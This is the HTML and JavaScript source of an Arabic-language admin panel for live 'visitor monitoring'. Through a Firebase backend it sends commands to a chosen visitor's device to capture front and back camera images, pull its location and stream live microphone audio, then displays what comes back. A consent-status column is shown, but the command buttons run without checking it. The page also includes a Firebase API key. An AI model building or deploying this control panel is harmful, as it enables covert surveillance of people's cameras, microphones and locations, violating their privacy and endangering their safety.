<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة الإدارة - مراقبة مباشرة</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background:#f1f5f9; margin:0; padding:20px; }
    .panel { background:white; padding:20px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.1); margin-bottom:20px; }
    table { width:100%; border-collapse:collapse; }
    th, td { padding:14px; text-align:right; border-bottom:1px solid #ddd; cursor:pointer; }
    th { background:#1e40af; color:white; }
    .status-granted { color:#10b981; font-weight:bold; }
    .status-denied { color:#ef4444; font-weight:bold; }
    .status-pending { color:#f59e0b; font-weight:bold; }
    .new { background:#fefce8; }
  </style>
</head>
<body>

<div class="panel">
  <h1>🔴 مراقبة الزوار (الحديث في الأعلى)</h1>
  <table id="visitorsTable">
    <thead>
      <tr>
        <th>الاسم المميز</th>
        <th>معرف الزائر</th>
        <th>الجهاز</th>
        <th>الموافقة</th>
        <th>أول زيارة</th>
        <th>آخر نشاط</th>
        <th>الموقع</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>
</div>

<div class="panel" id="controlPanel" style="display:none;">
  <h2>مراقبة: <span id="selectedId"></span> (<span id="selectedName"></span>)</h2>
  
  <button onclick="sendCommand('frontCamera')" style="background:#3b82f6;color:white;">📸 كاميرا أمامية</button>
  <button onclick="sendCommand('backCamera')" style="background:#ef4444;color:white;">📸 كاميرا خلفية</button>
  <button onclick="sendCommand('requestLocation')" style="background:#10b981;color:white;">📍 تحديث الموقع</button>
  <button onclick="sendCommand('startLiveAudio')" style="background:#8b5cf6;color:white;">🎤 استماع مباشر</button>

  <h3>البث المباشر</h3>
  <img id="live-img" src="" style="max-width:700px; border:4px solid #ef4444; border-radius:12px;">

  <h3>الموقع</h3>
  <div id="map" style="height:400px;border-radius:12px;"></div>

  <h3>الصوت</h3>
  <audio id="live-audio" controls style="width:100%;"></audio>
</div>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let selectedVisitor = null;
  let visitorNames = {}; // لتخزين الأسماء المميزة

  function generateVisitorName(id) {
    const names = ["أحمد", "محمد", "علي", "عمر", "خالد", "يوسف", "مريم", "فاطمة", "نور", "سارة"];
    const num = Math.floor(Math.random() * 999) + 1;
    return `زائر_${names[num % names.length]}${num}`;
  }

  function loadVisitors() {
    db.ref('visitors').on('value', snap => {
      let visitorsArray = [];
      
      snap.forEach(child => {
        const d = child.val();
        const id = child.key;

        // إنشاء اسم مميز إذا لم يكن موجود
        if (!visitorNames[id]) {
          visitorNames[id] = generateVisitorName(id);
        }

        const firstVisit = d.firstVisit ? new Date(d.firstVisit).toLocaleString('ar-EG') : '—';
        const lastActive = d.lastActive ? new Date(d.lastActive).toLocaleString('ar-EG') : '—';

        let statusHTML = d.consentStatus === "granted" ? 
          '<span class="status-granted">✅ موافق</span>' : 
          d.consentStatus === "denied" ? 
          '<span class="status-denied">❌ رفض</span>' : 
          '<span class="status-pending">⏳ في انتظار</span>';

        visitorsArray.push({
          html: `<tr onclick="selectVisitor('${id}')">
            <td><strong>${visitorNames[id]}</strong></td>
            <td>${id}</td>
            <td>${d.device || '-'}</td>
            <td>${statusHTML}</td>
            <td>${firstVisit}</td>
            <td>${lastActive}</td>
            <td>${d.location ? '✅' : '❌'}</td>
          </tr>`,
          lastActive: d.lastActive || 0
        });
      });

      // ترتيب من الأحدث إلى الأقدم
      visitorsArray.sort((a, b) => b.lastActive - a.lastActive);

      let html = visitorsArray.map(item => item.html).join('');
      document.querySelector('#visitorsTable tbody').innerHTML = html || '<tr><td colspan="7">لا يوجد زوار حالياً</td></tr>';
    });
  }

  function selectVisitor(id) {
    selectedVisitor = id;
    document.getElementById('selectedId').textContent = id;
    document.getElementById('selectedName').textContent = visitorNames[id] || 'غير معروف';
    document.getElementById('controlPanel').style.display = 'block';

    watchLiveFrame(id);
    watchLocation(id);
    watchLiveAudio(id);
  }

  function sendCommand(type) {
    if (!selectedVisitor) return alert("اختر زائر أولاً");
    db.ref('commands/' + selectedVisitor).set({ type: type, time: Date.now() });
  }

  function watchLiveFrame(id) {
    db.ref('live/' + id + '/frame').on('value', snap => {
      const f = snap.val();
      if (f && f.data) document.getElementById('live-img').src = f.data;
    });
  }

  function watchLocation(id) {
    db.ref('visitors/' + id + '/location').on('value', snap => {
      const loc = snap.val();
      if (loc) {
        document.getElementById('map').innerHTML = 
          `<iframe width="100%" height="400" src="https://www.google.com/maps?q=${loc.lat},${loc.lng}&z=16&output=embed" frameborder="0"></iframe>`;
      }
    });
  }

  function watchLiveAudio(id) {
    db.ref('live/' + id + '/audio').on('value', snap => {
      const a = snap.val();
      if (a && a.data) {
        document.getElementById('live-audio').src = a.data;
        document.getElementById('live-audio').play().catch(() => {});
      }
    });
  }

  // تحديث آخر نشاط كل 10 ثواني
  setInterval(() => {
    if (selectedVisitor) {
      db.ref('visitors/' + selectedVisitor).update({ lastActive: Date.now() });
    }
  }, 10000);

  window.onload = loadVisitors;
</script>
</body>
</html>
